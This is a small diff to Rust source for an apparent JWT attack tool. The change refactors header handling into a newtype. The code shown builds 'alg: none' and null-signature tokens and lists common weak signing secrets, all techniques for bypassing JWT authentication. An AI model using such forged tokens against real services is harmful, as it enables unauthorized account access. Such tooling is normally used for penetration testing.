@@ -1,5 +1,6 @@
 use crate::decoder::decode_jwt;
 use crate::encoder::encode_payload;
+use crate::newtypes::*;
 
 const COMMON_SECRETS: &[&str] = &["secret", "password", "1234", "1234567890"];
 
@@ -16,7 +17,7 @@ pub fn alg_none(claims: &str) -> Vec<Attack> {
     let mut attacks = Vec::new();
 
     for alg_type in variations {
-        let header = format!(r#"{{"alg":"{}","typ":"JWT"}}"#, alg_type);
+        let header = format!(r#"{{"alg":"{}","typ":"JWT"}}"#, alg_type).into();
         let mut token = encode_payload(&header, claims);
         token.push('.');
         attacks.push(Attack {
@@ -30,7 +31,7 @@ pub fn alg_none(claims: &str) -> Vec<Attack> {
     attacks
 }
 
-pub fn null_sig(header: &str, claims: &str) -> String {
+pub fn null_sig(header: &Header, claims: &str) -> String {
     let mut token = encode_payload(header, claims);
     token.push('.');
     token
